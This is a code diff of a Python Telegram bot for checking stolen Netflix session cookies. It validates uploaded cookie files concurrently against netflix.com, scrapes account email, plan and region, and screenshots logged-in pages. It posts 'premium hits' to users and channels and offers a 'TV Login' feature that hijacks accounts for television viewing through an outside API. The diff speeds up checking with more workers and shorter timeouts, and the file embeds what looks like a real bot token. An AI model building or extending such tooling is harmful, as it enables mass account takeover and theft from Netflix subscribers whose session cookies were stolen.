@@ -34,7 +34,9 @@ BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
 ADMIN_ID = 6176299339
 CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
 USERS_FILE = "users.txt"
-SCREENSHOT_SEMAPHORE = threading.Semaphore(5) 
+
+# Increased Semaphores for much faster concurrent screenshot rendering
+SCREENSHOT_SEMAPHORE = threading.Semaphore(20) 
 
 app = Flask(__name__)
 
@@ -104,7 +106,6 @@ def extract_deep_details(html):
     plan_match = re.search(r'"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}', html)
     if plan_match: details["plan"] = clean_text(plan_match.group(1))
     elif re.search(r'"currentPlanName":"([^"]+)"', html): details["plan"] = clean_text(re.search(r'"currentPlanName":"([^"]+)"', html).group(1))
-    elif re.search(r'data-uia="plan-label">([^<]+)<', html): details["plan"] = clean_text(re.search(r'data-uia="plan-label">([^<]+)<', html).group(1))
 
     qual_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}', html)
     if qual_match: details["quality"] = clean_text(qual_match.group(1))
@@ -181,7 +182,7 @@ def call_api(endpoint, payload):
     try:
         payload["secret_key"] = SECRET_KEY
         headers = {"Content-Type": "application/json"}
-        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, headers=headers, timeout=15)
+        resp = requests.post(f"{API_BASE_URL}/{endpoint}", json=payload, headers=headers, timeout=10)
         return resp.json()
     except Exception as e:
         pass 
@@ -203,7 +204,6 @@ def check_cookie(cookie_input):
         except: pass
 
     if "%" in cookie_input: cookie_input = urllib.parse.unquote(cookie_input)
-
     if cookie_input.lower().startswith("cookie:"): cookie_input = cookie_input.split(":", 1)[1].strip()
     
     cookie_str = cookie_input
@@ -238,48 +238,41 @@ def check_cookie(cookie_input):
         
         for c in playwright_cookies: session.cookies.set(c['name'], c['value'], domain=c['domain'])
 
-        resp = session.get("https://www.netflix.com/browse", timeout=10, allow_redirects=False)
+        # Fast HTTP Check
+        resp = session.get("https://www.netflix.com/browse", timeout=7, allow_redirects=False)
         if resp.status_code == 302 and "login" in resp.headers.get("Location", ""): return {"valid": False, "msg": "Redirected to Login (Dead)"}
         if resp.status_code == 200 and "login" in resp.url: return {"valid": False, "msg": "Redirected to Login (Dead)"}
 
-        resp_acc = session.get("https://www.netflix.com/account", timeout=15)
+        resp_acc = session.get("https://www.netflix.com/account", timeout=10)
         acc_html = resp_acc.text
-        
         deep_data = extract_deep_details(acc_html)
         
         country = get_country_from_html(acc_html)
         if deep_data["country"] != "Unknown": country = deep_data["country"]
+        if deep_data["email"] == "N/A" and api_response and api_response.get("email"): deep_data["email"] = api_response.get("email")
 
-        if deep_data["email"] == "N/A" and api_response and api_response.get("email"):
-             deep_data["email"] = api_response.get("email")
-
-        magic_link = "Token Not Found"
-        token_source = "None"
-        
-        if api_link:
-            magic_link = api_link
-            token_source = "NFTGen API"
+        magic_link = api_link if api_link else "Token Not Found"
+        token_source = "NFTGen API" if api_link else "None"
         
         if deep_data["status"] == "Expired": return {"valid": False, "msg": "Session Valid but Account Expired (Former Member)"}
         elif deep_data["status"] == "Free/Never Paid": return {"valid": False, "msg": "Session Valid but No Subscription (Never Member)"}
 
         screenshot_bytes = None
         try:
-            if SCREENSHOT_SEMAPHORE.acquire(timeout=20):
+            if SCREENSHOT_SEMAPHORE.acquire(timeout=5): # Faster timeout so it doesn't block workers forever
                 try:
                     with sync_playwright() as p:
                         browser = p.chromium.launch(headless=True)
                         context = browser.new_context(user_agent=HEADERS['User-Agent'], viewport={'width': 1280, 'height': 720})
                         context.add_cookies(playwright_cookies)
                         page = context.new_page()
-                        page.goto("https://www.netflix.com/browse", timeout=30000, wait_until='domcontentloaded')
-                        try: page.wait_for_timeout(3000)
-                        except: pass
-                        screenshot_bytes = page.screenshot(type='jpeg', quality=70)
+                        # Removed 3 second hardcoded sleep, and changed wait_until to 'load' for ultra-speed
+                        page.goto("https://www.netflix.com/browse", timeout=15000, wait_until='load')
+                        screenshot_bytes = page.screenshot(type='jpeg', quality=50) # Lightweight fast screenshot
                         browser.close()
                 finally:
                     SCREENSHOT_SEMAPHORE.release()
-        except Exception as e: print(f"Screenshot Error: {e}")
+        except Exception as e: pass
 
         return {"valid": True, "country": country, "magic_link": magic_link, "data": deep_data, "token_source": token_source, "screenshot": screenshot_bytes}
         
@@ -290,7 +283,7 @@ def check_cookie(cookie_input):
 
 def main():
     print(f"{Fore.RED}========================================")
-    print(f"{Fore.WHITE}   NETFLIX COOKIE CHECKER BOT (TG)      ")
+    print(f"{Fore.WHITE}   NETFLIX FAST CHECKER BOT (TG)        ")
     print(f"{Fore.RED}========================================{Style.RESET_ALL}\n")
     keep_alive()
 
@@ -337,9 +330,7 @@ def main():
         kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
         kb.add("📩 Send Here (DM)", "📡 Send to Channel")
         kb.add("📺 TV Login", "🛑 Stop System")
-        
-        welcome_msg = ("**🔥 Netflix Direct Scraper V32**\n\n👋 **Welcome!** Select Mode to Begin:")
-        bot.send_message(message.chat.id, welcome_msg, reply_markup=kb, parse_mode='Markdown')
+        bot.send_message(message.chat.id, "**🔥 Netflix Ultra-Fast Scraper V32**\n\n👋 **Welcome!** Select Mode to Begin:", reply_markup=kb, parse_mode='Markdown')
 
     @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
     def verify_join(call):
@@ -348,10 +339,9 @@ def main():
             kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
             kb.add("📩 Send Here (DM)", "📡 Send to Channel")
             kb.add("📺 TV Login", "🛑 Stop System")
-            bot.send_message(call.message.chat.id, "**✅ Verified!**\n**🔥 Netflix Direct Scraper V32**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
+            bot.send_message(call.message.chat.id, "**✅ Verified!**\nSelect Mode:", reply_markup=kb, parse_mode='Markdown')
         else: bot.answer_callback_query(call.id, "❌ You haven't joined all channels yet!", show_alert=True)
 
-    # --- NEW TV LOGIN FEATURE ---
     @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
     def tv_login_start(message):
         msg = bot.reply_to(message, "📺 **TV Login Mode Activated**\n\n1️⃣ Please send your **Netflix Cookie** first.")
@@ -359,58 +349,22 @@ def main():
 
     def process_tv_cookie(message):
         cookie = message.text.strip()
-        
         nid_match = re.search(r"NetflixId=([^;]+)", cookie)
         netflix_id_val = nid_match.group(1) if nid_match else cookie
         
-        if len(netflix_id_val) < 50:
-            return bot.reply_to(message, "❌ Invalid Cookie length. Try again by clicking '📺 TV Login'.")
-
+        if len(netflix_id_val) < 50: return bot.reply_to(message, "❌ Invalid Cookie length. Try again by clicking '📺 TV Login'.")
         msg = bot.reply_to(message, "✅ **Cookie Validated!**\n\n2️⃣ Now enter the **8-Digit TV Code** shown on your TV screen.")
         bot.register_next_step_handler(msg, lambda m: execute_tv_login(m, netflix_id_val))
 
     def execute_tv_login(message, netflix_id):
         tv_code = message.text.strip()
         bot.reply_to(message, "⏳ **Processing TV Login...** Please wait.")
-        
         res = call_api("tvlogin", {"netflix_id": netflix_id, "tv_code": tv_code})
         
-        if res and res.get("success"):
-            bot.reply_to(message, f"✅ **TV Login Successful!** 🎉\n\n**Status:** {res.get('message', 'Logged in to TV')}\nEnjoy watching Netflix!")
+        if res and res.get("success"): bot.reply_to(message, f"✅ **TV Login Successful!** 🎉\n\n**Status:** {res.get('message', 'Logged in to TV')}")
         else:
             err = res.get("message", "Unknown Error / API Offline") if res else "API is unreachable right now."
             bot.reply_to(message, f"❌ **TV Login Failed!**\n\n**Reason:** {err}")
-
-    @bot.message_handler(commands=['users', 'stats'])
-    def user_stats(message):
-        if message.chat.id != ADMIN_ID: return
-        try:
-            count = 0
-            if os.path.exists(USERS_FILE):
-                with open(USERS_FILE, "r") as f: count = len(f.read().splitlines())
-            bot.reply_to(message, f"📊 **Total Users:** {count}")
-        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
-
-    @bot.message_handler(commands=['broadcast'])
-    def broadcast(message):
-        if message.chat.id != ADMIN_ID: return
-        msg = bot.reply_to(message, "📝 **Send the message (Text, Image, File) to broadcast:**")
-        bot.register_next_step_handler(msg, perform_broadcast)
-
-    def perform_broadcast(message):
-        try:
-            if not os.path.exists(USERS_FILE): return bot.reply_to(message, "❌ No users found.")
-            with open(USERS_FILE, "r") as f: users = f.read().splitlines()
-            count = 0
-            for uid in users:
-                try:
-                    if message.content_type == 'text': bot.send_message(uid, message.text)
-                    elif message.content_type == 'photo': bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
-                    elif message.content_type == 'document': bot.send_document(uid, message.document.file_id, caption=message.caption)
-                    count += 1
-                except: pass
-            bot.reply_to(message, f"✅ **Broadcast sent to {count} users.**")
-        except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
 
     @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
     def stop_sys(message):
@@ -444,7 +398,6 @@ def main():
         mode = user_modes.get(uid)
         
         if message.text and (message.text.startswith("/") or message.text in ["📩 Send Here (DM)", "📡 Send to Channel", "📺 TV Login", "🛑 Stop System"]): return
-        
         if not mode: return bot.reply_to(message, "❌ **Select a mode first!**", parse_mode='Markdown')
         if mode.get('stop'): return bot.reply_to(message, "🛑 **System is stopped.**\nClick a Mode button to resume.")
 
@@ -454,7 +407,7 @@ def main():
                 file_info = bot.get_file(message.document.file_id)
                 downloaded_file = bot.download_file(file_info.file_path)
                 
-                if message.document.file_name.endswith('.zip'):
+                                if message.document.file_name.endswith('.zip'):
                     with zipfile.ZipFile(io.BytesIO(downloaded_file)) as z:
                         for filename in z.namelist():
                             if filename.endswith('.txt'):
@@ -466,7 +419,7 @@ def main():
             
             if not valid_cookies: return bot.reply_to(message, "❌ **No Valid Cookies Found!**", parse_mode='Markdown')
 
-            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background._", parse_mode='Markdown')
+            bot.reply_to(message, f"🚀 **Checking {len(valid_cookies)} Cookies...**\n_Task started in background at ultra-fast speed!_", parse_mode='Markdown')
             
             def background_checker(cookies, chat_id, target):
                 valid_count = 0
@@ -482,7 +435,8 @@ def main():
                     except: pass
                     return None
 
-                with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
+                # INCREASED MAX WORKERS TO 60 FOR LIGHTNING FAST SPEED
+                with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
                     futures = [executor.submit(process_cookie, c) for c in cookies]
                     for future in concurrent.futures.as_completed(futures):
                         if user_modes.get(chat_id, {}).get('stop'): break
@@ -518,7 +472,6 @@ def main():
 
     def send_hit(chat_id, res, cookie):
         data = res.get("data", {})
-        
         def esc(t): return str(t).replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
 
         country_code = res.get('country', 'Unknown')
@@ -540,8 +493,6 @@ def main():
         lines.append("🌟 **NETFLIX PREMIUM ULTRA HIT** 🌟")
         lines.append("")
         lines.append(f"🟢 **STATUS:** Active ✅")
-        
-        # --- ENHANCED COUNTRY FLAG FEATURE ---
         if country_code != "Unknown": lines.append(f"🌍 **REGION:** {esc(country_code)} {flag}")
             
         if data.get('member_since') and data['member_since'] != "Unknown":
